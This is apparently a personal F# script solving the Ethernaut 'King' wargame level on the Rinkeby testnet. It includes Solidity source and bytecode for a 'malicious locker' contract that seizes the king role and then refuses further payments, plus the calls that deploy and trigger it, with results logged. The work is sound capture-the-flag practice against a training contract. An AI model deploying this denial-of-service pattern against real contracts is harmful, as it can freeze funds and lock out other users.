#i """nuget: C:\Users\jon_h\source\repos\web3\web3.fs\bin\Release\"""
#r "nuget: web3.fs, 0.2.6.1" 

open web3.fs

// Values and partial applications
let digest = newKeccakDigest
let con = createWeb3Connection "http://127.0.0.1:1248" "2.0"
let constants = createDefaultConstants "0x2268b96e204379ee8366505c344ebe5cc34d3a46"
let mon = createReceiptMonitor con

let call = makeEthCall con constants
let txn = makeEthTxn con constants

let ethernautContractAddress = "0xD991431D8b033ddCb84dAD257f4821E9d5b38C33"
let ethernautABI = """[{"inputs":[{"internalType":"contractLevel","name":"_level","type":"address"}],"name":"createLevelInstance","outputs":[],"stateMutability":"payable","type":"function"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"player","type":"address"},{"indexed":false,"internalType":"contractLevel","name":"level","type":"address"}],"name":"LevelCompletedLog","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"player","type":"address"},{"indexed":false,"internalType":"address","name":"instance","type":"address"}],"name":"LevelInstanceCreatedLog","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"inputs":[{"internalType":"contractLevel","name":"_level","type":"address"}],"name":"registerLevel","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"addresspayable","name":"_instance","type":"address"}],"name":"submitLevelInstance","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"}]""" |> ABI

// Load up our contract, set deeper partials
let deployedEthernaut = loadDeployedContract digest ethernautContractAddress RINKEBY ethernautABI |> bindDeployedContract |> List.head
let callEthernaut = call deployedEthernaut
let txnEthernaut = txn deployedEthernaut
let submitInstance = txnEthernaut (ByString "submitLevelInstance") 

// using the browser-based button from now on to get an instance, so that I can use the submit button and get the little
// info blurb on success

// deployed instance: 0x99Ce3f617Defc5CBe1acc47430ee4853D3bf8f65
let kingABI = """[{"inputs":[],"stateMutability":"payable","type":"constructor"},{"inputs":[],"name":"_king","outputs":[{"internalType":"addresspayable","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"addresspayable","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"prize","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"stateMutability":"payable","type":"receive"}]""" |> ABI
let king = loadDeployedContract digest "0x99Ce3f617Defc5CBe1acc47430ee4853D3bf8f65" RINKEBY kingABI |> bindDeployedContract |> List.head

// Malicious locker contract:
(*
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract KingLocker {

    bool public locked = false;

    constructor() public payable {}
    
    receive() external payable {
        require(locked == false, "already locked");
    }

    function getBal() public view returns (uint256){
        return address(this).balance;
    }

    function lockKing(address payable king) public payable {
      uint bal = address(this).balance;
      king.call{value: bal}("");
      locked = true;
    }
}
*)
// This is designed to lock the receive function after sending the value via `call`

// Get current king
makeEthCall con constants king (ByString "_king") []
|> logEthCallResult Typed

// get current prize
makeEthCall con constants king (ByString "prize") []
|> logEthCallResult Typed

// [Address "0x43BA674B4fbb8B157b7441C2187bCdD2cdF84FD5"]
// [Uint256 "1000000000000000"]

let level9LockerABI = """[{"inputs":[],"stateMutability":"payable","type":"constructor"},{"inputs":[],"name":"getBal","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"addresspayable","name":"king","type":"address"}],"name":"lockKing","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"locked","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"stateMutability":"payable","type":"receive"}]""" |> ABI
let bytecode = """608060405260008060006101000a81548160ff02191690831515021790555061023f8061002d6000396000f3fe6080604052600436106100385760003560e01c80632482b7df146100cb57806325caa2621461010f578063cf3090121461013a576100c6565b366100c6576000151560008054906101000a900460ff161515146100c4576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600e8152602001807f616c7265616479206c6f636b656400000000000000000000000000000000000081525060200191505060405180910390fd5b005b600080fd5b61010d600480360360208110156100e157600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610167565b005b34801561011b57600080fd5b506101246101f0565b6040518082815260200191505060405180910390f35b34801561014657600080fd5b5061014f6101f8565b60405180821515815260200191505060405180910390f35b60004790508173ffffffffffffffffffffffffffffffffffffffff168160405180600001905060006040518083038185875af1925050503d80600081146101ca576040519150601f19603f3d011682016040523d82523d6000602084013e6101cf565b606091505b50505060016000806101000a81548160ff0219169083151502179055505050565b600047905090565b60008054906101000a900460ff168156fea264697066735822122091c42c9738c628cf2c536b59628860487c06d69a4d1617471c73fc27686aec8e64736f6c634300060c0033""" |> RawContractBytecode

prepareUndeployedContract digest bytecode None RINKEBY level9LockerABI 
|> Result.bind (deployEthContract con constants "2000000000000000")
|> logWeb3Error
|> monitorTransaction mon

// Locker deployed to: 0xfcb3405bd7be3da0ffe9517ea3d70a062765c33c

let locker = loadDeployedContract digest "0xfcb3405bd7be3da0ffe9517ea3d70a062765c33c" RINKEBY level9LockerABI |> bindDeployedContract |> List.head

// get the locker's balance
makeEthCall con constants locker (ByString "getBal") []
|> logEthCallResult Typed

// [Uint256 "2000000000000000"]

// Attempt lock
makeEthTxn con constants locker (ByString "lockKing") [Address "0x99Ce3f617Defc5CBe1acc47430ee4853D3bf8f65"] ZEROV
|> logWeb3Error
|> monitorTransaction mon

// confirm I'm the king, and that my locker's receive is locked
makeEthCall con constants king (ByString "_king") []
|> logEthCallResult Typed

makeEthCall con constants locker (ByString "locked") []
|> logEthCallResult Typed

// [Address "0xfcb3405bd7be3da0ffe9517ea3d70a062765c33c"]
// [Bool true]
